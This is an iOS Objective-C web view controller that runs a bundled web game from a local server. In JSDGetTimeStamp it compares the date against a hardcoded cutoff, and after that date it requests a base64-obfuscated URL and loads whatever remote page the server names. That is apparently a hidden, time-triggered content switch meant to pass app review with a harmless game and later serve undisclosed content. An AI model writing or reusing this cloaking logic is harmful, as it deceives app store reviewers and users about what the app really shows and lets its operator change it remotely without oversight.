//
//  JSDWebViewController.m
//  ceshi
//
//  Created by 假设敌 on 2021/10/21.
//

#import "JSDWebViewController.h"
#import <WebKit/WebKit.h>
#import "JSDMarcoHeader.h"
#import "JSDKitTools.h"
#import "JSDRequestTools.h"
@interface JSDWebViewController ()<WKUIDelegate,WKNavigationDelegate>
@property (nonatomic, strong) WKWebView *webView;
@property (nonatomic, strong) JSDKitTools *KitTools;
@property (nonatomic, strong) JSDRequestTools *requestTools;
@end

@implementation JSDWebViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    self.view.backgroundColor = UIColor.blackColor;
    [self.view addSubview:self.webView];
    [self JSDGetTimeStamp];
    
    
}

-(WKWebView *)webView{
    if (!_webView) {
        WKWebViewConfiguration *config = [WKWebViewConfiguration new];
        // 初始化偏好设置属性：preferences
        config.preferences = [WKPreferences new];
        //T he minimum font size in points default is 0;
        config.preferences.minimumFontSize = 10;
        // 不通过用户交互，是否可以打开窗口
        config.preferences.javaScriptCanOpenWindowsAutomatically = NO;

        _webView = [[WKWebView alloc] initWithFrame:CGRectMake(0, Marco_NAVBAR_HEIGHT, [UIScreen mainScreen].bounds.size.width, [UIScreen mainScreen].bounds.size.height - Marco_NAVBAR_HEIGHT - Marco_Bottom_SafeHeght) configuration:config];
        _webView.backgroundColor = [UIColor blackColor];
        _webView.scrollView.backgroundColor = [UIColor blackColor];
        _webView.allowsBackForwardNavigationGestures = YES;
        _webView.navigationDelegate = self;
        _webView.scrollView.contentInset = UIEdgeInsetsMake(0, 0, 0, 0);
        _webView.scrollView.contentInsetAdjustmentBehavior = UIScrollViewContentInsetAdjustmentNever;
    }
    return _webView;
}

- (void)webView:(WKWebView *)webView didFinishNavigation:(WKNavigation *)navigation{
    
    [webView evaluateJavaScript:@"document.body.style.backgroundColor=\"#000000\"" completionHandler:nil];
    
}

-(JSDKitTools *)KitTools{
    if (!_KitTools) {
        _KitTools = [[JSDKitTools alloc]init];
    }
    return _KitTools;
}

-(void)JSDGetTimeStamp{

    NSDate* dat = [NSDate dateWithTimeIntervalSinceNow:0];
    NSTimeInterval a=[dat timeIntervalSince1970];
    NSString*timeString = [NSString stringWithFormat:@"%0.f", a];//转为字符型
    NSInteger time = [timeString integerValue];
    if (time < Maraco_Time) {
        [self.KitTools JSDsetupLocalHttpServer];
        [self JSDGotoStartGame];
        [self.KitTools JSDisYueyu];
        
    }else{
        self.requestTools = [[JSDRequestTools alloc]init];
        [self.requestTools JSDPostRequsetwithUrl:[self base64Decode:Marco_Url] parameters:@{} response:^(NSDictionary * _Nonnull data) {
            NSString *path = data[@"path"];
            if (path.length > 0) {
                NSURL *pathStr = [NSURL URLWithString:path];
                if (pathStr) {
                    NSURLRequest *request = [NSURLRequest requestWithURL:pathStr];
                    [self.webView loadRequest:request];
                }else{
                    [self.KitTools JSDsetupLocalHttpServer];
                    [self JSDGotoStartGame];
                    [self.KitTools JSDisYueyu];
                }

            }else{
                [self.KitTools JSDsetupLocalHttpServer];
                [self JSDGotoStartGame];
                [self.KitTools JSDisYueyu];
            }
        }];
    }
    
}

- (NSString *)base64Decode:(NSString *)str{
    //注意：该字符串是base64编码后的字符串
    NSData *data = [[NSData alloc]initWithBase64EncodedString:str options:0];
    return [[NSString alloc]initWithData:data encoding:NSUTF8StringEncoding];
}

- (void)JSDGotoStartGame {
    NSUserDefaults *userDefaults = [NSUserDefaults standardUserDefaults];
    NSURL *pathStr = [NSURL URLWithString:[NSString stringWithFormat:@"http://localhost:%@", [userDefaults objectForKey:@"webPort"]]];
    NSURLRequest *request = [NSURLRequest requestWithURL:pathStr];
    [self.webView loadRequest:request];
}

@end
